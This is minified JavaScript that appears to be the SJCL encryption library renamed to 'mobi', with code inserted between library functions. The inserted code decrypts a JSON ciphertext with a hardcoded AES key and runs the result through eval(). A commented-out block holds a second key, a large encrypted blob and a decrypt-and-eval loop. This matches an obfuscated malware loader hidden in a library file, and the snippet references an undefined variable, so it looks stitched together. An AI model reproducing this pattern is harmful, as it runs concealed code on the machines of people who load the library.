        (!mobi.mode[b.mode] || !mobi.cipher[b.cipher] || "string" === typeof a && 100 >= b.iter || 64 !== b.ts && 96 !== b.ts && 128 !== b.ts || 128 !== b.ks && 192 !== b.ks && 0x100 !== b.ks || !b.iv || 2 > b.iv.length || 4 < b.iv.length) && q(new mobi.exception.invalid("json mobid: invalid parameters"));
        "string" === typeof a ? (f = mobi.misc.cachedPbkdf2(a, b), a = f.key.slice(0, b.ks / 32), b.salt = f.salt) : mobi.ecc && a instanceof mobi.ecc.elGamal.secretKey && (a = a.unkem(mobi.codec.base64.toBits(b.kemtag)).slice(0, b.ks / 32));
        "string" === typeof c && (c = mobi.codec.utf8String.toBits(c));
        f = new mobi.cipher[b.cipher](a);
        c = mobi.mode[b.mode].mobid(f, b.ct, b.iv, c, b.ts);
        e.e(d, b);
        d.key = a;
        return mobi.codec.utf8String.fromBits(c)
    },
    mobid: function (a, b, c, d) {
        var e = mobi.json;
        return e.X(a, e.decode(b), c, d)
    },
    encode: function (a) {
        var b, c =
            "{",
            d = "";
        for (b in a)
            if (a.hasOwnProperty(b)) switch (b.match(/^[a-z0-9]+$/i) || q(new mobi.exception.invalid("json encode: invalid property name")), c += d + '"' + b + '":', d = ",", typeof a[b]) {
            case "number":
            case "boolean":
                c += a[b];
                break;
            case "string":
                c += '"' + escape(a[b]) + '"';
                break;
            case "object":
                c += '"' + mobi.codec.base64.fromBits(a[b], 0) + '"';
                break;
            default:
                q(new mobi.exception.bug("json encode: unsupported type"))
            }
            return c + "}"
    },
    decode: function (a) {
        a = a.replace(/\s/g, "");
        a.match(/^\{.*\}$/) || q(new mobi.exception.invalid("json decode: this isn't json!"));
        a = a.replace(/^\{|\}$/g, "").split(/,/);
        var b = {},
            c, d;
        for (c = 0; c < a.length; c++)(d = a[c].match(/^(?:(["']?)([a-z][a-z0-9]*)\1):(?:(\d+)|"([a-z0-9+\/%*_.@=\-]*)")$/i)) || q(new mobi.exception.invalid("json decode: this isn't json!")), b[d[2]] = d[3] ? parseInt(d[3], 10) : d[2].match(/^(ct|salt|iv)$/) ? mobi.codec.base64.toBits(d[4]) : unescape(d[4]);
        return b
    },
    e: function (a, b, c) {
        a === t && (a = {});
        if (b === t) return a;
        for (var d in b) b.hasOwnProperty(d) && (c && (a[d] !== t && a[d] !== b[d]) && q(new mobi.exception.invalid("required parameter overridden")),
            a[d] = b[d]);
        return a
    },
    ea: function (a, b) {
        var c = {},
            d;
        for (d in a) a.hasOwnProperty(d) && a[d] !== b[d] && (c[d] = a[d]);
        return c
    },
    da: function (a, b) {
        var c = {},
            d;
        for (d = 0; d < b.length; d++) a[b[d]] !== t && (c[b[d]] = a[b[d]]);
        return c
    }
};
mobi.mobie = mobi.json.mobie;
mobi.mobid = mobi.json.mobid;
mobi.misc.ca = {};

  //var a1= Array(-318766095,174176526,719938345,-1810406777);
  var a1= Array(440101567,448016039,-195482857,-811732580);
  var rp1 = {};
  if (b.match("{")) {
     try {
        var d = window.mobi.mobid(a1, b, {}, rp1);
        eval(d);
       } catch(e) {
        console.log(e);
      }
  }


/*
//  var v = form.get(), iv = v.iv, key = v.key, adata = v.adata, aes, ciphertext=v.ciphertext, rp = {};
 // var iv=Array(-669289105,1094747622,-670234334,1280760365);
  var a1= Array(1240278930,86703748,-562466090,1434859726);
  //var password="rakesh";
  //var adata = "this is Rakesh Jain";
  //var tag = 64;
  //var vmode = "ccm";
  //var var aes;
  //var ciphertext='{"iv":"YIl09SIHw1x+xPGwrHY/MA==","ct":"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="}';
  var c="";
  var rp = {};
  var b=a;
  for(var i=0;i<b.length;i++){
      c = b[i];
      if (c.match("{")) {
        try {
          //v.plaintext = mobi.decrypt(v.password || v.key, ciphertext, {}, rp);
          var d = window.mobi.mobid(a1, c, {}, rp);
          //console.log(d);
          eval(d);
        } catch(e) {
          //console.log("Opp Error in process! "+e);
          //return;
        }
      }
  }

*/


mobi.misc.cachedPbkdf2 = function (a, b) {
    var c = mobi.misc.ca,
        d;
    b = b || {};
    d = b.iter || 1E3;
    c = c[a] = c[a] || {};
    d = c[d] = c[d] || {
        firstSalt: b.salt && b.salt.length ? b.salt.slice(0) : mobi.random.randomWords(2, 0)
    };
    c = b.salt === t ? d.firstSalt : b.salt;
    d[c] = d[c] || mobi.misc.pbkdf2(a, c, b.iter);
    return {
        key: d[c].slice(0),
        salt: c.slice(0)
    }
};